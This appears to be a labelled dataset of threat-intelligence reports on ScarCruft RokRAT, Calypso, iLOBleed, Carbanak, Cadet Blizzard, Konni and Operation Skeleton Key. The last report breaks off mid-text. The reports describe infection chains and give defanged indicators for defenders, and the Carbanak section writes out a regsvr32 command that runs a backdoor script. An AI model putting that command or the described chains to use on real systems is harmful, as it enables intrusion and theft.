cyber policy organizations, and other cybersecurity professionals. We observed ScarCruft using oversized Windows Shortcut (LNK) files that initiate multi-stage infection chains delivering RokRAT, a custom-written backdoor associated with the threat group. RokRAT is a fully-featured backdoor equipped with capabilities that enable its operators to conduct effective surveillance on targeted entities. In an attempt to execute undetected, the infection chains involve multiple executable formats and evasion techniques. They continue an existing trend, closely resembling the infection chains seen in ScarCruft activities from earlier in 2023, including the campaigns disclosed by AhnLab in April 2023, Checkpoint in May 2023, and Qi An Xin in July 2023. By targeting high-profile experts in North Korean affairs and news organizations focused on North Korea, ScarCruft continues to fulfill its primary objective of gathering strategic intelligence. This enables the adversary to gain a better understanding of how the international community perceives developments in North Korea, thereby contributing to North Korea’s decision-making processes. ScarCruft’s focus on consumers of technical threat intelligence reports suggests an intent to gain insights into non-public cyber threat intelligence and defense strategies. This helps in identifying potential threats to their operations and contributes to refining their operational and evasive approaches. As we continue to track suspected North Korean threat actors and their pace of experimentation, we assess they have a growing interest in mimicking cybersecurity professionals and businesses, ultimately for use in the targeting of specific customers and contacts directly, or more broadly through brand impersonation.A phishing email, impersonating a member of the North Korea Research Institute (Institute for North Korean Studies – INKS), was sent from the email address kirnchi122[@]hanmail.net on December 13, 2023, targeting an expert in North Korean affairs. The email contains an attached archive file named December 13th announcement.zip (machine translation from Korean), which includes nine files. The files claim to be presentation materials from a fabricated event relevant to the targeted individual — an apparent human rights expert discussion meeting. To make the phishing email current and therefore more credible, the email asserts that the meeting occurred on the same date the email was sent (December 13).Among the nine files, seven are benign Hangul Word Processor (HWP) and PowerPoint documents, while two are malicious LNK files. LNK files have become popular among threat actors for malware deployment since Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources. In an attempt to make the malicious LNK files blend among the benign files, all files have names that relate to human rights in North Korea and start with a number assigned to each file. Furthermore, the LNK files disguise themselves as Hanword documents, using the Hangul Word Processor icon (the Icon location LNK artifact was set to C:\\Program Files (x86)\\Hnc\\Office 2018\\HOffice100\\Bin\\Hwp.exe).The LNK files exceed 48 MB and implement a multi-stage mechanism deploying the RokRAT backdoor.The LNK files execute PowerShell code that performs the following actions: Locates the executing LNK file based on its filesize. Extracts from the LNK file a decoy document (in HWP and HWPX format), a Windows Batch script named 111223.bat, and a PowerShell script named public.dat, placing the script in the %Public% folder. Displays the decoy document and executes 111223.bat. Deletes the executing Shortcut file. The PowerShell code locates the content of the files it extracts from the LNK file based on hardcoded offsets.111223.bat then executes the PowerShell script stored in %Public%\\public.dat. This script decodes and executes another hex-encoded PowerShell script embedded in public.dat.The decoded script downloads from a major Cloud file hosting provider a file named myprofile[.]zip, XOR-decrypts the file using the first byte as an XOR key, and executes the decrypted content in a thread. myprofile[.]zip implements a shellcode that deploys the RokRAT backdoor. RokRAT uses public Cloud services for command-and-control purposes, such as pCloud and Yandex Cloud, disguising malicious communication as legitimate network traffic.While most of the documents we analyzed are stripped of metadata, a HWPX decoy document stands out by containing metadata that identifies the pseudonym bandi as the document’s creator. We note the use of the same string in the context of Kimsuky activities, for example, in an email address used in a phishing campaign (bandi00413[@]daum.net) and in a C2 server domain (one.bandi[.]tokyo). While the overlap in pseudonym use does not represent a strong link between the groups from a technical perspective, it is still indicative of the suspected relations between them. In the context of North Korea, the term bandi is known as the pseudonym of a suspected North Korean author known for publishing dissident writing. bandi also means ‘firefly’ in Korean.Some of the individuals targeted in the December 2023 ScarCruft activity, discussed above, were also targeted approximately one month earlier on November 16, 2023. This speaks of the adversary’s persistence and adaptability in pursuing its goals. The November campaign included individuals from a news organization focused on North Korea as well. A phishing email, impersonating a member of the North Korea Research Institute, was sent from the address c039911[@]daum.net. The email attaches two malicious HWP files, titled 조선 시장 물가 분석(회령).hwp (Shipbuilding market price analysis (Hoeryeong).hwp) and 조선 시장 물가 분석(신의주).hwp (Shipbuilding market price analysis (Sinuiju).hwp, machine translation from Korean), disguised as North Korean market price analysis data.The documents contain OLE objects, activated by double-clicking on the document’s content. In adherence to the HWP document format, the OLE objects are stored as compressed Structured Storage objects, and their decompression reveals C2 URLs accessed upon OLE object activation. The HWP documents contain metadata, including the LinkValue, Last Saved By, and Author metadata values, which provide information on the system accounts where the documents have been created.The DailyN~1/dailynk_001/dailynk01 account is particularly interesting since it relates to Daily NK, a prominent South Korean online news outlet that provides independent reporting on North Korea with which we have collaborated in the past. The focus of this organization makes them an attractive target for North Korean threat actors seeking to intrude or impersonate it, a strategy previously observed by SentinelLabs in past Kimsuky campaigns. It remains to be investigated whether this account is used for developing malware involved in Daily NK-related campaigns and/or serves as an additional indicator of the suspected relations between Kimsuky and ScarCruft. Additionally, in our previous reporting on the overlap of suspected North Korean intrusions into a Russian missile engineering organization, we shared links to ScarCruft infrastructure making use of this same illicit naming scheme, such as dallynk[.]com. Pivoting on the DailyN~1 artifact revealed additional HWP documents that share overlapping metadata information and employ the same OLE-based infection vector, using different C2 URLs.At the time of analysis, the C2 URLs were inactive, preventing us from examining their functions and any potential additional payloads they might deliver to the targets. We are still investigating the role of the user and view query parameter values, such as 5JV0FAGA6KW1GBHB7LX2HCIC and H11I75PFF0ZG53NDG00H64OE. While preparing this report, Genians released research that outlines ScarCruft campaigns throughout 2023, covering certain aspects of the activities discussed in this section. We add to the public information on this activity cluster by providing additional details on the related infrastructure. Infrastructure associated with this cluster of suspected North Korean threat activity leads to multiple interesting details which we have found useful for further monitoring and analysis of separate campaigns. The domains offlinedocument[.]site and documentoffice[.]club both make use of a variety of subdomains such as open, nav, and app as previously mentioned. During their illicit use, the domains temporarily make use of Lithuania’s Cherry Servers virtual private server (VPS) hosting service – 84.32.131[.]87, and 84.32.131[.]104 in this case. A repeating trend is the actor registering domains through Namecheap, leaving the domain parked on a Namecheap IP address, and then rotating to Cherry Servers. In separate domains, we observe this same operational workflow, and interestingly other domains which the actor only makes use of for one or two days before shifting back to a parked IP address. We assess this process aims to limit detection and analysis capabilities following their malicious activity, such as hosting a phishing login or malware delivery link. Examples of this activity can be found through publicly available telemetry, such as that of instantreceive[.]org. This domain hosted a page mimicking GitHub, a characteristic not new to North Korea-attributed threat actors, as we have reported on in the past.This domain overlaps through the use of unique Cherry Servers hosting IPs, which can be used for further moderate-confidence infrastructure pivoting. We encourage readers to conduct additional research and monitoring. The full list shown here is provided in the IOC table.While investigating ScarCruft activities, we retrieved malware that we assess to be part of ScarCruft’s planning and testing processes. This includes a spectrum of shellcode variants delivering RokRAT, public tooling, and two oversized LNK files, named inteligence.lnk and news.lnk. Although similar to those implemented by 3. 이윤식 북한인권법 실행방안 북한인권재단 출범 중심.lnk and 8. 이도건 북한연구소 토론회.lnk discussed above, the infection chains executed by inteligence.lnk and news.lnk exhibit some differences. This has likely been done to evade detection based on the known ScarCruft techniques that have been publicly disclosed by the threat intelligence community.inteligence.lnk executes PowerShell code, which locates the executing LNK file based on its filename instead of its filesize. The code then extracts from the LNK file and displays a decoy PDF document (named inteligence.pdf), and downloads from a major Cloud file hosting provider a hex-encoded file named story.txt. The PowerShell code locates the content of the decoy document it extracts from the LNK file based on a byte pattern (50 4b 03 04) instead of a hardcoded file offset. The PowerShell code then decodes the file, and executes the decoded file content in a thread. story.txt implements a benign shellcode that just opens notepad.exe, indicating that inteligence.lnk has been developed for testing purposes. In contrast to 3. 이윤식 북한인권법 실행방안 북한인권재단 출범 중심.lnk and 8. 이도건 북한연구소 토론회.lnk, inteligence.lnk does not execute a Windows Batch script and an external PowerShell script.news.lnk downloads, in the form of a file named story3.txt, and executes PowerShell code. The implementation and functionality of the code are very similar to that executed by inteligence.lnk, with a major difference being that the shellcode it executes is not downloaded from a remote endpoint but is embedded in the LNK file itself. In contrast to inteligence.lnk, the shellcode executed by news.lnk is weaponized and deploys the RokRAT backdoor. It is likely that news.lnk is the fully developed version of inteligence.lnk, intended for use in future ScarCruft campaigns. As of the time of writing, we have not observed news.lnk or its variants in the wild. Both LNK files deploy the same decoy document – a public research report on the Kimsuky threat group by Genians, a South Korean cybersecurity company. The report is written in Korean and was released in late October 2023.Given the report’s technical content, the LNK file names, and ScarCruft’s use of decoys relevant to the targeted individuals, we suspect ScarCruft has been planning phishing or social engineering campaigns on recent developments in the North Korean cyber threat landscape, targeting audiences consuming threat intelligence reports.The findings outlined in this post highlight ScarCruft’s ongoing dedication to gathering strategic intelligence through targeted attacks. Our insight into ScarCruft’s malware testing activities reveals the adversary’s commitment to innovating its arsenal and expanding its target list, likely intending to target and/or masquerade as cybersecurity professionals or businesses. We observed the group experimenting with new infection chains inspired by those they have used in the past. This involves modifying malicious code implementations and excluding certain files from the infection steps, likely as a strategy to evade detection based on filesystem artifacts and the known ScarCruft techniques that have been publicly disclosed by the threat intelligence community. We suspect that ScarCruft is pursuing non-public cyber threat intelligence and defense strategies. This could benefit not only ScarCruft specifically but also the other constituent groups within the North Korean threat landscape, aiding them in identifying threats to their operations and improving their operational playbooks. A heightened awareness and better understanding of the adversary’s attack and infection methods among potential targets are crucial for effective defense. SentinelLabs remains actively engaged in tracking ScarCruft activities and supporting the organizations and individuals at risk of being targeted.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "A newly discovered APT group, dubbed Calypso after a custom malware RAT that it uses, has been targeting state institutions in six different countries since 2016. Government organizations in India (34 percent), Brazil and Kazakhstan (18 percent respectively), Russia and Thailand (12 percent respectively) and Turkey (6 percent) have all been successfully infiltrated at some point, according to analysts at Positive Technologies (PT), which first spotted the group in March. To that point, the typical modus operandi of the threat actors consists of infiltrating the network perimeter by exploiting a Windows SMB remote code-execution vulnerability (CVE-2017-0143) or by using stolen credentials. Once inside the network, the group injects a backdoor RAT program – the Calypso web shell – that it uses to execute commands and upload utilities and malware (including well-known tools like Mimikatz, and the NSA hacking tools EternalBlue and EternalRomance), all in an effort to move laterally. The goal is to reach endpoints on a targeted organization’s LAN and steal confidential data. The APT also uses a variety of legitimate administrative tools, which helps it stay under the radar, PT pointed out.“These attacks succeeded largely because most of the utilities the group uses to move inside the network are widely used by the specialists everywhere for network administration,” said Denis Kuvshinov, lead specialist in threat analysis at Positive Technologies, via email. “The group used publicly available utilities and exploit tools.” The Calypso RAT (it’s unclear whether this is named after the Greek goddess from the Odyssey, the fruit drink, the island backbeat familiar from music world or something else altogether) is a custom affair. It contains a dropper for first-stage infection, which then extracts a further payloads in the form of a Windows batch script (BAT) for installation. The BAT file contains variables that can be invoked to have it save files, modify services and modify registry keys. PT analysis showed that the dropper next executes shellcode, which provides the interface for communicating with the command-and-control (C2) server and for downloading various modules. Once the C2 connection is made, the shellcode sends the C2 information about the infected computer, via TCP and SSL (such as computer name, current date, OS version, 32-bit vs. 64-bit OS and CPU, and IP addresses on network interfaces and their MAC addresses). Calypso RAT next can execute a total of 12 commands in the form of modules, each of which is self-contained and has two communication pipelines: One for transmitting data from the module to C2, and the other for receiving data from C2. Each module has a unique ID assigned by C2. Among the commands are directions to launch three threads. “One is a heartbeat sending an empty packet to C2 every 54 seconds,” explained PT, in the analysis. “The other processes and executes commands from C2. As for the third thread, we could not figure out its purpose, because the lines implementing its functionality were removed from the code. All we can tell is that this thread was supposed to ‘wake up’ every 54 seconds, just like the first one.” In some attacks, the backdoor has also fetched executables, including the FlyingDutchman malware, which includes functions such as screenshot capture, remote shell, and file system operations. As for attribution, PT said that its forensics indicate that the discovered APT group is likely to be of Asian origin and is Chinese-speaking. The firm reached this conclusion because in some of the attacks, the hackers accidentally disclosed their real IP addresses, which belonged to Chinese providers. “The IP address belongs to China Telecom,” according to a PT analysis launched Thursday. “We believe the attackers could have been careless and set up the proxy server incorrectly, thus disclosing their real IP address. This is the first piece of evidence supporting the Asian origins of the group.” Further, the researchers noted that in one of the attacks the group used PlugX malware — traditionally used by many Chinese APT groups. Calypso also used the Byeby trojan, which was involved in the China-linked SongXY malware campaign in 2017. “The group has several successful hacks to its credit, but still makes mistakes allowing us to guess its origins,” PT concluded. “All data given here suggests that the group originates from Asia and uses malware not previously described by anyone…We keep monitoring the activities of Calypso closely and expect the group will attack again.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "A previously unknown rootkit has been found setting its sights on Hewlett-Packard Enterprise's Integrated Lights-Out (iLO) server management technology to carry out in-the-wild attacks that tamper with the firmware modules and completely wipe data off the infected systems. The discovery, which is the first instance of real-world malware in iLO firmware, was documented by Iranian cybersecurity firm Amnpardaz this week. “There are numerous aspects of iLO that make it an ideal utopia for malware and APT groups: Extremely high privileges (above any level of access in the operating system), very low-level access to the hardware, being totally out of the sight of the admins, and security tools, the general lack of knowledge and tools for inspecting iLO and/or protecting it, the persistence it provides for the malware to remain even after changing the operating system, and in particular being always running and never shutting down,” the researchers said.Besides managing the servers, the fact that iLO modules have broad access to all the firmware, hardware, software, and operating system (OS) installed on the servers make them an ideal candidate to breach organizations using HP servers, while also enabling the malware to maintain persistence after reboots and survive OS reinstallations. However, the exact modus operandi used to infiltrate the network infrastructure and deploy the wiper remains unknown as yet.Dubbed iLOBleed, the rootkit has been put to use in attacks since 2020 with the goal of manipulating a number of original firmware modules in order to stealthily obstruct updates to the firmware. Specifically, the modifications made to the firmware routine simulates the firmware upgrade process — by purportedly displaying the right firmware version and adding relevant logs — when in reality no updates are performed. “This alone shows that the purpose of this malware is to be a rootkit with maximum stealth and to hide from all security inspections,” the researchers said. “A malware that, by hiding in one of the most powerful processing resources (which is always on), is able to execute any commands received from an attacker, without ever being detected.” Although the adversary remains unidentified, Amnpardaz described the rootkit as likely the work of an advanced persistent threat (APT), a designation a nation-state or state-sponsored group that employs continuous, clandestine, and sophisticated hacking techniques to gain unauthorized access to a system and remain inside for a prolonged period of time without attracting attention.HPE, in a statement shared with The Hacker News said that the vulnerability being exploited is not new and that it was disclosed and patched by the company in 2017. Given that versions iLO 4 and prior are at more risk of being modified and infected by the malware, the enterprise IT firm pointed out that customers who followed the recommended corrective actions or have upgraded to iLO 5 are not susceptible to exploitation. If anything, the development once again brings firmware security into sharp focus, necessitating that firmware updates shipped by the manufacturer are promptly applied to mitigate potential risks, iLO networks are segmented from the operating networks, and that the firmware is periodically monitored for signs of infection. “Another important point is that there are methods to access and infect iLO both through the network and through the host operating system,” the researchers noted. “This means that even if the iLO network cable is completely disconnected, there is still the possibility of infection with the malware. Interestingly, there is no way to turn off or disable iLO completely in case it is not needed.”\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "In mid-2018, Bitdefender researchers investigated a targeted attack on an Eastern European financial institution, gaining new insights and creating a complete event timeline showing how the infamous group Carbanak infiltrates organizations, how it moves laterally across the infrastructure, and the time it takes to set up the actual heist. The initial point of compromise found in our investigation involved the use of spear-phishing emails with malicious URLs and tainted documents rigged to download a Cobalt Strike beacon component. Within hours of compromise, the cybercriminal group would begin to move laterally across the infrastructure, identify critical documents and prepare them for exfiltration, and try to access the organization’s ATM and banking applications. Bitdefender’s forensic analysis revealed some key compromise tactics.Several spear-phishing campaigns attributed to Carbanak, all occurring between March and May 2018, were analyzed by security researchers in 2018. These campaigns impersonated emails from high-profile organizations, such as IBM or European Central Bank, but also cybersecurity companies. While most forensic investigations focus on offering a highly technical analysis of the payloads used by the Carbanak group, Bitdefender’s investigation offers a complete timeline of events, from the moment the email reached the victim’s inbox to the moment of the heist.One of the most prolific APT-style cyberattacks, specifically targeting the financial sector, is known as Carbanak. Discovered in 2014, the campaign quickly gained notoriety after compromising the security systems of 100 banks in 40 countries and stealing up to $1 billion in the process. Banks in countries such as Russia, the United Kingdom, the Netherlands, Spain, Romania, Belarus, Poland, Estonia, Bulgaria, Georgia, Moldova, Kyrgyzstan, Armenia, Taiwan and Malaysia have allegedly been targeted with spear-phishing emails, luring victims into clicking malicious URLs and executing booby-trapped documents. The same group is believed to have also been using the Cobalt Strike framework to run sophisticated campaigns, plotting and performing financial heists of financial institutions. Following an investigation led by law enforcement in cooperation with cybersecurity companies, the leader of the group was apprehended in Alicante, Spain, on March 26th, 2018. However, this action doesn’t appear to have made a dent in the cybercriminal organization, as subsequent spear-phishing campaigns seem to have been reported from March until May 2018.A Carbanak trademark in cyberattacks remains the use of Cobalt Strike – a powerful pentesting tool designed for exploiting and executing malicious code, simulating post-exploitation actions of advanced threat actors – which allows them to infiltrate the organization, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools. While the end results of such an attack can be easily assessed in financial losses, little information has been publicly available until now on how the attack occurs step-by-step within a compromised organization.The APT-style cybercriminal group has a long track record of successfully targeting financial institutions around the world to either cash out at ATMs or perform wire transfers using the bank’s internal systems. The spear-phishing emails sent to the financial institutions either end up with victims downloading a tampered document meant to download the Cobalt Strike beacon or to exploit several unpatched Remote Code Execution Vulnerabilities and deploy a backdoor. Once the user attempts to open the attached documents, scripts (Fig. 1) embedded within the files are dropped on the disk and automatically executed in the background. This is a popular technique, sometimes associated with advanced persistent threats (APTs) attributed to nation-sponsored threat actors.Designed for stealth infiltration within the targeted system, the attacks use reconnaissance tools designed to assess the state of the victim’s workstation and determine what tools should be downloaded next, or even open decoy documents similar to the one in Fig.2, to avoid drawing victims’ suspicion.Bitdefender’s forensics and investigation team was contacted to look into a security incident that started in May 2018 with an email received by two of the bank’s employees. As previously mentioned, the date coincides with a Carbanak spear-phishing campaign. The attack target was to gain access to banking systems and eventually withdraw funds in cash from ATMs. The pattern exhibited by attackers and their lateral movements across the infrastructure show that they knew what types of information to look for and they were skilled at evasion techniques. Judging by the way the adversaries interacted with different systems, the targeted hosts and the documents prepared for exfiltration, it appears that the cybercriminal group focused initially on mapping the internal processes and applications of the affected institution. They displayed a deep understanding of the nature and location of the data they sought. They were able to maintain a low network footprint and avoid suspicion by using selected single workstations as a hub for centralizing collected information and for communication with their command & control server, outside the regular working hours of the bank. After compromising the first victim, the aggressors’ next goal was to find admin-level credentials that would allow them to move across the entire infrastructure. By performing all these operations outside business hours and limiting their interaction to only a handful of systems, the cybercriminal group minimized the detection opportunities.A carefully executed network reconnaissance and lateral movement plan was unfolding during this time. What follows is a timeline of events that started with the initial spear-phising email.At this point, the adversary had the ability to download and execute new payloads, download additional scripts, run shell commands to move laterally in the infrastructure, and delete files from the system and cleaning registry keys to leave fewer forensics traces. In this phase, attackers compromised additional network endpoints, gathering data and using one of the endpoints for collecting and storing internal documents that appeared of interest.Lateral movements and intelligence collection continue, while attackers also target and compromise additional internal hosts and servers that will be used during the actual heist. Between Day 30 to 46, over a period of 17 days, a series of archives were created containing manuals, guides and training materials for different applications. The information gathered was archived and organized in different folders. This information was relevant in planning the attack on the bank and, potentially, other banks that share similar systems. The cybercriminal group could be actively improving its understanding of internal banking systems by collecting and studying this type of information, in an attempt to make their attacks more efficient and stealthier. Their specialization in compromising banking infrastructures could be a direct consequence of intelligence collected and assimilated after each attack on previous financial institutions. This level of intimate knowledge of how banking applications work based on stolen documentation, helps them quickly achieve their purpose, which is to access and transfer financial assets. The more information they have on the inner workings of banking applications, the easier it becomes to pull off surgical cyber heists and avoid security tripwires.Starting on Day 33, attackers connected to servers and hosts with access to banking applications. The connections were initiated from workstations that had activity after regular office hours. The workstations used to connect to these machines were logged in from and controlled by a workstation that was not part of the legitimate corporate infrastructure. The system belonged to the adversary and accessed the organization network through a VPN tunnel established by the Cobalt Strike beacon component, to contact the internal corporate network systems. These command & control connections last between 20 minutes and one hour on average, based on the logs available for forensic investigation. The documents prepared for exfiltration, which were relevant to the internal applications, as well as the connections to banking applications after regular office hours, point to a financially motivated attack. Below is a complete lateral movement timeline that includes all major events related to what infrastructure assets were compromised and when. Marked in red are the three major milestones achieved during the attack: the moment the domain controller was compromised, the moment documents started being stored on an internal endpoint, and when the threat actors first connected to a host with access to banking applications . This lateral movement timeline was compiled based on forensic evidence correlated from several analyzed systems and network events. It is the most relevant blueprint, revealing a complete attack timeline and behavior of the notorious financial cyber-criminal group when inside an infrastructure belonging to a financial organization.Below is a detailed analysis of the key indicators of compromise that helped build the APT timeline. It includes an event timeline compiled from two workstations used in the attack: the one used to compromise the domain controller and the one used to store all the network-collected data. The following events help paint a clear picture of actions immediately after the spear-phishing email attachment was opened, and show how the threat actors move laterally across the infrastructure and how they gathered relevant documentation. The “swift-fraud[.]com/documents/94563784.doc” URL was opened from the body of an email received in a spearphishing campaign targeting financial institutions. The Bitdefender research team obtained the document from our Threat Intelligence feeds and started analyzing it. According to other threat reports, the same URL has been used in delivering other tainted documents, potentially part of similar campaigns aimed at other financial institutions. This suggests the cybercriminal group may have been delivering multiple documents to victims, potentially laced with other exploits or droppers. The attack flow leaves behind a temporary file, which was found on two of the systems analyzed in the incident response. This temporary file was created on the filesystem after the opening of the original document file, downloaded from the malicious URL mentioned above. Analysis of the document on one of the systems reveals the steps involved in compromising the targeted system via the spear phishing email. The document contains four objects that are dropped on the filesystem of the victim:The DLL Dropper downloaded on step four was not found on the file system and has the role of decrypting and dropping yet another JavaScript Dropper on the system. The decrypted JavaScript will be saved at the path “%APPDATA%\\.txt” where registry_value = “HKEY_CURRENT_USER\\Software\\Microsoft\\Notepad[USERNAME]\\303F1428C3F”. Before exiting, the DLL will self-delete. The file “303F1428C3F.txt” (eb561d46c6283c632df88bd20ade6df4) can be found at the path C:\\Users\\[redacted]\\ AppData\\Roaming\\303F1428C3F.txt. Also, the file was obfuscated and encrypted with RC4. After decryption, the binary tried to download a JavaScript backdoor from the Command and Control server (C&C) “nl[.][redacted][.]kz/robots.txt” and saved the file to “%APPDATA%\\9D01CA.txt”. The backdoor “%APPDATA%\\9D01CA.txt” was then executed via “regsrv32” (ex. “regsvr32 /S /N /U /I:path_backdoor scrobj”). The file “9D01CA.txt” sent an initial fingerprint of the system compromised which contained the name of the antivirus solution installed on the system, the local IP address, username, computername and OS version. After this communication, the component waited for instructions from the C&C “nl[.][redacted][.]kz/api/v1”. The traffic with the C&C was encrypted and the commands received from the C&C would split into five types.All files mentioned in this stage of the attack were created on the system on Day 0 at around 16:49, when the first download link was accessed. It is worth mentioning that a binary executable named “rad353F7.tmp”, which appeared on the system at a later date, Day 6, was most certainly downloaded on the system by the Javascript Backdoor “9D01CA.txt”. Day 0 at 16:48:58 marks the touchdown of a decoy file on two systems. This file is a decoy because it acts as a normal document file while the malicious payload is being dropped on the system. On one of the two workstations, the decoy file has the creation time of Day 0 at 16:49:09 (10 seconds later than the other workstation) and the path C:\\Users\\[redacted]\\AppData\\Local\\ Temp\\cqHfjCkTtMwG.doc. This system shows more stages of the attack, because the adversary used this machine to perform lateral movement and compromise a domain administrator account within two hours of the initial compromise. After the compromise of the domain administrator account, a network discovery is performed and systems start to be logged on via remote desktop protocol to reach the objective of infiltrating the network and gathering information. Below is a complete timeline of events recorded on the workstation that was used to compromise the domain administrator account employed by attackers throughout the lateral movement process.The Cobalt Strike beacon is a malicious agent implant that, once dropped on a compromised system, calls back to the attacker and checks for new commands to be executed on the compromised system. This versatile tool can support two types of communication mechanisms: asynchronous and interactive. The asynchronous mode keeps commands in a queue and, when the beacon connects to a C&C, it downloads commands, executes them, and finally reports results to the C&C server. This can be particularly useful when trying to keep a low network footprint and not trigger any alarms by constantly “chatting” back and forth with the C&C server. While the asynchronous communication mode is also known as “low and slow”, in the sense that it becomes inactive when an internet connection is not present, the interactive communication mode offers real-time interaction with the compromised workstation. Overall framework capabilities include, but are not limited to, executing shell commands, uploading and downloading files, recording keystrokes and taking screenshots, escalating privileges, deploying exploits, bypassing User Account Control (UAC), and even deploying memory scraping tools, such as Mimikatz, or enumerating Active Directory (AD) hosts. By supporting malleable communication with the C&C server, it can help attackers blend malicious traffic as legitimate, by allowing them to transform and store data, interpret it backwards, and extract and recover that data from a transaction. Cobalt Strike Framework capabilities.The Carbanak group, which has a long track record of compromising infrastructure belonging to financial institutions, is still active. Its purpose remains to manipulate financial assets, such as transferring funds from bank accounts or taking over ATM infrastructures and instructing them to dispense cash at predetermined time intervals. Bitdefender’s investigation shows the attackers’ main methods remain to quietly infiltrate the infrastructure by establishing a foothold on an employee’s system, then move laterally across the infrastructure or elevate privileges to find critical systems that manage financial transactions or ATM networks. This attack falls in line with previous objectives observed in past attacks on other financial institutions, as the cybercriminal organization targeted the ATM network to reach systems belonging to key people within the organization who have access to ATM systems. If the attack had succeeded, it would have given hackers control over the ATM network, while money mules would have been standing by the ATM machines at pre-set time intervals to cash them out. They could have also been able to reset the cash-out limit on ATMs, using a predetermined / preauthorized card. This way, money mules could have extracted the same amount over and over, without the ATMs reporting any transactions to the bank. It is not uncommon in a targeted attack for phishing emails to bypass anti-spam solutions deployed at the mail server level, which is why it is good practice to deploy an in-depth security model that ensures URL filtering, behavior-based detection techniques and sandboxing, aside from classical anti-malware solutions. An enterprise-level solution that looks at both network traffic and endpoint behavior would observe lateral movements by the attacker and flag them for review by a security analyst. The damage observed throughout the investigation process was limited to access of internal documents on the compromised systems and user account credentials leaked.\n\n\n",

        "explain": "Security researchers at Microsoft are publicly outing a new APT group linked to Russia’s General Staff Main Intelligence Directorate (GRU), warning that the threat actor has worked on destructive wiper malware attacks that hit organizations in Ukraine. A new report from Redmond’s threat intelligence team tagged the group as ‘Cadet Blizzard’ and documented signs and evidence that adds clarity to the scope and usage of malware in a wartime environment. “[The] emergence of a novel GRU affiliated actor, particularly one which has conducted destructive cyber operations likely supporting broader military objectives in Ukraine, is a notable development in the Russian cyber threat landscape,” Microsoft said, noting that Cadet Blizzard produced the infamous WhisperGate wiper malware that wiped the Master Boot Record (MBR) of computers in Ukraine. Microsoft is also, for the first time, linking the Russian APT group to defacements on multiple Ukrainian organization websites and the hack-and-leak Telegram channel known as “Free Civilian”. The company said its threat intel team has been tracking the group since the release of the WhisperGate wiper in January 2022 and believes it was operational in some capacity since 2020. “Operationally consistent with the remit and assessed objectives of GRU-led operations throughout Russia’s invasion of Ukraine, Cadet Blizzard has engaged in focused destructive attacks, espionage, and information operations in regionally significant areas,” Microsoft said. Primary targeted sectors include government organizations and information technology providers in Ukraine and even organizations in Europe and Latin America. The researchers found that the actor compromises and maintains a foothold on affected networks for months, often exfiltrating data prior to disruptive actions. Microsoft described some of Cadet Blizzard’s work as “haphazard” and said it discovered evidence that at least one Russian private sector organization has materially supported the hackers by providing operational support during the WhisperGate destructive attack. “Cadet Blizzard has repeatedly targeted information technology providers and software developers that provide services to government organizations using a supply chain “compromise one, compromise many” technique,” Microsoft noted.\n\n\n",

        "explain": "Defenders observe a new phishing attack, in which adversaries weaponize a russian-language Microsoft Word document to distribute malware that can extract sensitive data from targeted Windows instances. Hackers behind this offensive campaign belong to a North Korean group dubbed Konni, which shares similarities with a cyber-espionage cluster tracked as Kimsuky APT. The long-run offensive campaign by the North Korean Konni APT group aimed at RAT malware distribution and data exfiltration reminds defenders of the escalating risks of phishing attacks that are continuously causing a stir in the cyber threat arena. SOC Prime Platform provides a set of new Sigma rules developed by Threat Bounty author, Zaw Min Htun, to detect the latest Konni campaign. All detection algorithms are compatible with dozens of SIEM, EDR, XDR, and Data Lake technologies to be used across multiple technologies and are mapped to the MITRE ATT&CK® framework: Possible Evasion of Konni Campaign Activity through Detection of Registry Settings (via registry_event) Possible Konni’s Campaing Malware Execution Flow via Registry Key (via process_creation) These Sigma rules address the Defense Evasion tactic with the Modify Registry technique (T1112). Suspicious Konni’s C2 Connection Attempt Detected through the Identification of Associated URL (via proxy) This detection addresses the Command and Control tactic with the corresponding Application Layer Protocol (T1071) technique and Web Protocols (T1071.001) sub-technique. Detection Engineers and Threat Hunters striving to accelerate their cyber defense skill set while sharing their expertise with peers are welcome to join the ranks of SOC Prime’s Threat Bounty Program. To help your organization stay ahead of attacks linked to the Konni APT group, rely on the entire collection of relevant Sigma rules augmented with CTI and actionable metadata. Click Explore Detections to drill down to the list of SOC content for Konni-related attacks. North Korean Konni APT Group Attack Analysis FortiGuard Labs uncovered a novel phishing campaign attributed to a North Korean threat actor Konni that takes advantage of a harmful russian-language Word document to spread malware on the impacted systems. Konni APT group is notorious for its sophisticated cyber-espionage campaigns aimed at data exfiltration. Adversaries leverage multiple malware samples and tools, continuously evolving their tactics to for detection evasion, which poses growing challenges to defenders. Konni group has been observed exploiting the WinRAR vulnerability (CVE-2023-38831) and obfuscating Visual Basic scripts to spread Konni RAT and a Windows Batch script aimed to steal sensitive data from the compromised machines. The ongoing campaign, which has been active for an extended period, takes advantage of RAT malware capable of extracting sensitive data and executing commands on impacted devices. Hackers apply multiple approaches for gaining initial access, delivering payloads, and establishing persistence within the networks of targeted victims. In the latest campaign, Konni leverages an advanced toolset embedded in a harmful Word document through batch scripts and DLL files. The payload includes a User Account Control (UAC) bypass and encrypted communication with a C2 server, giving attackers the green light to run privileged commands. With the increasing number of attacks attributed to North Korean APT groups, global organizations fuel the need for vigilant cybersecurity practices and proactive threat detection measures. By leveraging Uncoder AI, the industry-first IDE for detection engineering, security engineers can write highly resilient detection code faster and smarter, as well as translate it to 65 security language formats at sub-second performance.\n\n\n",

        "explain": "This threat report provides an analysis of the advanced persistent threat (APT) attacks that have occurred during the past two years on the semiconductor industry. Our research shows that the majority of these attacks were concentrated on the Taiwan semiconductor sector. This is worthy of concern, as Taiwan’s semiconductor industry plays a very crucial role in the world. Even a small disruption in the supply chain could have a serious ripple effect throughout the entire industry. Surprisingly, up until now, there has been less coverage on these attacks. In this report, we seek to shed light on the threat actors and campaigns of these attacks, where they are collectively referred to as Operation Skeleton Key. Additionally, we provide a brief overview of the current information security status of Taiwan’s semiconductor industry. With decades of development, Taiwan has established itself as a leading player in the semiconductor supply chain, including many well-known leaders in the area. According to a report by the Semiconductor Equipment and Materials International (SEMI),the global industry association representing the electronics manufacturing supply chain, Taiwan has been the largest consumer of semiconductor materials in the past several years [1]. Meanwhile, Wikipedia, says that Taiwan is currently among the top 5 sales leaders in multiple segments including foundry, integrated device manufacturer (IDM), fabless and outsourced semiconductor assembly and testing (OSAT) [2]. In 2019, Taiwan’s total semiconductor value reached a staggering $11.4 billion. 